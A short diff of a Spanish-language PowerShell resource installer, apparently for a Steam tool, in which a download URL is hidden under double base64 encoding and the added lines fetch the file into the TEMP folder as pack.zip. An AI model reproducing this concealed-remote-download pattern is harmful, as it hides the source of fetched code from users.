@@ -1,8 +1,11 @@
 ## Configuración  - Recursos
-$Host.UI.RawUI.WindowTitle = "SteamNexus | Instalador de Recursos"
-$a = "YUhSMGNIQnpPaTh2WjJsaGRHaHViMk5oYlM5VUxYSXlNUzh2YkdselpXNWpaUzl5Wld4bFlYTmxjeTlrYjNkdWJHOWhaQzkyTVM0d0xqQXZZM0ZqYXk1NmFYQT0="
-$b = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a))
-$LuasUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b))
+$Host.UI.RawUI.WindowTitle = " Instalador de Recursos"
+$x="YUhSMGNIQnpPaTh2WjJsaGRHaHViMk5oYlM5VUxYSXlNUzh2YkdselpXNWpaUzl5Wld4bFlYTmxjeTlrYjNkdWJHOWhaQzkyTVM0d0xqQXZZM0ZqYXk1NmFYQT0="
+$y=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x))
+$LuasUrl=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($y))
+
+[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
+iwr $LuasUrl -OutFile "$env:TEMP\pack.zip"
 
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 chcp 65001 > $null
